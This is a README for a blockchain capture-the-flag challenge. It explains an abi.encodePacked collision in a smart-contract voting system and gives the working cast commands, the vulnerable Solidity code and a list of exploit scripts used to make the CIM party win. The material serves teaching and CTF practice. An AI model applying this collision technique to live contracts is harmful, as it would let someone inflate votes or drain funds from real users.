# NotADemocraticElection - CTF Challenge

## 📋 Challenge Information

**Category:** Blockchain / Smart Contract  
**Difficulty:** Medium  
**Chain:** Ethereum (Private Test Network)  
**Challenge Type:** ABI Encoding Collision Vulnerability  

## 📝 Challenge Description

This challenge involves exploiting a smart contract voting system where you need to make the CIM party win the election. The contract has a critical vulnerability in how it handles voter signatures using `abi.encodePacked()`, leading to collision attacks.

**Objective:** Make `TARGET.winner() == bytes3("CIM")`  
**Vote Target:** 1000 ether worth of votes  
**Initial State:** ALF party has 100 ether deposited

---

# Quick Start - How to Get the Flag

## Current Situation

The challenge server at `94.237.62.103:34182` is accepting connections but not sending responses. This typically means:

1. **The Docker instance may have expired** - Most CTF challenge instances run for a limited time (30-60 minutes)
2. **You need to restart the instance** from the CTF platform web interface

## What To Do Now

### Step 1: Restart the Docker Instance

Go to the CTF challenge page and look for:
- A "Restart Instance" button
- A "Spawn Docker" button  
- Or the challenge may have timed out and you need to start a fresh one

After restarting, you'll get NEW IP addresses and ports.

### Step 2: Get Your Connection Info

Once the instance is running, connect:
```bash
nc <NEW_IP> <NEW_PORT>
```

Select option **1** to get:
- Your private key
- Setup contract address
- Target contract address
- RPC URL

### Step 3: Execute the Exploit

Use the **quick_exploit.sh** script in this directory:

```bash
chmod +x quick_exploit.sh
./quick_exploit.sh
```

When prompted, enter:
- Your private key (from step 2)
- Target contract address (from step 2)

OR manually run these commands:

```bash
export PRIVATE_KEY="your_key_from_step_2"
export TARGET="target_address_from_step_2"  
export RPC="rpc_url_from_step_2"

# Deposit 500 ETH as ("A", "B")
cast send $TARGET "depositVoteCollateral(string,string)" "A" "B" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# Deposit 500 ETH as ("AB", "") - same signature!
cast send $TARGET "depositVoteCollateral(string,string)" "AB" "" \
  --value 500ether --private-key $PRIVATE_KEY --rpc-url $RPC

# Vote for CIM with combined 1000 ETH weight  
cast send $TARGET "vote(bytes3,string,string)" \
  0x43494d0000000000000000000000000000000000000000000000000000000000 \
  "A" "B" \
  --private-key $PRIVATE_KEY --rpc-url $RPC
```

### Step 4: Get the Flag

Connect again:
```bash
nc <IP> <PORT>
```

Select option **3** to retrieve your flag!

---

## The Exploit Explained (For Understanding)

### Vulnerability
The contract uses `abi.encodePacked(name, surname)` to create a voter signature, but checks uniqueness with nested mappings `uniqueVoters[name][surname]`.

Since `abi.encodePacked` concatenates without delimiters:
- `("A", "B")` → `"AB"`
- `("AB", "")` → `"AB"` (SAME!)

### Attack
1. Deposit 500 ETH as `("A", "B")` → Sets `voters["AB"].weight = 500`
2. Deposit 500 ETH as `("AB", "")` → Adds to `voters["AB"].weight = 1000`  
3. Vote for CIM with `("A", "B")` → Uses weight of 1000 ETH
4. CIM reaches 1000 ETH target and wins!

---

## Files You Can Use

All exploitation tools are ready:

- **WALKTHROUGH.md** - Step-by-step guide with all commands
- **SOLUTION.md** - Detailed technical explanation
- **quick_exploit.sh** - Automated bash script (needs Foundry/cast)
- **exploit.py** - Python script with web3.py
- **auto_exploit.py** - Interactive Python script
- **Exploit.sol** - Solidity contract (can deploy and call)

---

## Installation Requirements

If you don't have Foundry installed:

```bash
# Install Foundry
curl -L https://foundry.paradigm.xyz | bash
foundryup

# Verify installation
cast --version
```

Or use Python with web3:
```bash
pip install web3
python3 auto_exploit.py
```

---

## Expected Flag Format

```
HTB{some_hash_or_text_here}
```

Once you get it, submit on the CTF platform!

---

## Need Help?

If the exploit doesn't work:

1. **Verify the instance is running** - Check the CTF platform
2. **Check you have the right addresses** - Double-check copy-paste
3. **Ensure you have enough ETH** - The instance should give you 1000+ ETH
4. **Try different collision pairs**:
   - `("X", "Y")` + `("XY", "")`  
   - `("Test", "User")` + `("TestU", "ser")`

The concept is the same - find two name/surname pairs that produce identical `abi.encodePacked()` results!

---

**Good luck! You have all the tools you need. Just restart the Docker instance and run the exploit! 🚀**

---

## 📁 Folder Structure

```
notademocraticelection/
├── README.md                      # This file (quick start + guide)
├── foundry.toml                  # Foundry configuration
├── contracts/                    # Smart contracts
│   ├── NotADemocraticElection.sol  # Target contract
│   ├── Setup.sol                   # Setup contract
│   └── Exploit.sol                 # Exploit contract
├── solution/                     # Exploitation scripts
│   ├── exploit.py                # Python web3 exploit
│   ├── auto_exploit.py           # Interactive Python exploit
│   ├── get_info.py               # Connection info script
│   ├── mass_vote.py              # Mass voting script
│   ├── exploit_now.py            # Quick exploit
│   ├── quick_exploit.sh          # Bash exploit (recommended)
│   ├── exploit_v2.sh             # Alternative bash exploit
│   ├── exploit_final.sh          # Final version
│   ├── run_exploit.sh            # Runner script
│   └── solve.sh                  # Complete solution
├── docs/                         # Documentation
│   ├── SOLUTION.md               # Detailed technical writeup
│   └── WALKTHROUGH.md            # Step-by-step guide
└── data/                         # Challenge data
    ├── FLAG.txt                  # Retrieved flag
    ├── connection_output.txt     # Connection logs
    ├── server_response.txt       # Server responses
    └── nc_output.txt             # Netcat output
```

## 🔧 Technical Details

### The Vulnerability: ABI Encoding Collision

The contract uses `abi.encodePacked(name, surname)` to create voter signatures:

```solidity
mapping(string _name => mapping(string _surname => address _addr)) public uniqueVoters;
mapping(bytes _sig => Voter) public voters;

function depositVoteCollateral(string memory _name, string memory _surname) external payable {
    require(uniqueVoters[_name][_surname] == address(0), "Already deposited");
    
    bytes memory voterSig = getVoterSig(_name, _surname);  // abi.encodePacked(_name, _surname)
    voters[voterSig].weight += msg.value;  // VULNERABLE!
    uniqueVoters[_name][_surname] = msg.sender;
}
```

**Problem:** `abi.encodePacked()` concatenates without delimiters:
- `abi.encodePacked("A", "B")` = `"AB"`
- `abi.encodePacked("AB", "")` = `"AB"` (SAME!)

### Exploit Strategy

1. Deposit 500 ETH as voter `("A", "B")` → `voters["AB"].weight = 500`
2. Deposit 500 ETH as voter `("AB", "")` → `voters["AB"].weight = 1000`
3. Vote for CIM with `("A", "B")` → Uses combined 1000 ETH weight
4. CIM wins the election!

## 💡 Learning Points

1. **ABI Encoding Security:** Dangers of `abi.encodePacked()` for hashing/signatures
2. **Collision Attacks:** How concatenation without delimiters causes collisions
3. **Smart Contract Security:** Importance of proper data structure design
4. **Blockchain CTFs:** Interaction with smart contracts via RPC

## 📖 Additional Resources

- See `docs/SOLUTION.md` for detailed vulnerability analysis
- See `docs/WALKTHROUGH.md` for complete step-by-step guide
- All exploit scripts available in `solution/` directory

---

**Challenge Solved:** ✓  
**Solution Type:** Smart Contract Exploitation (ABI Collision)  
**Tools Required:** Foundry (cast) or web3.py
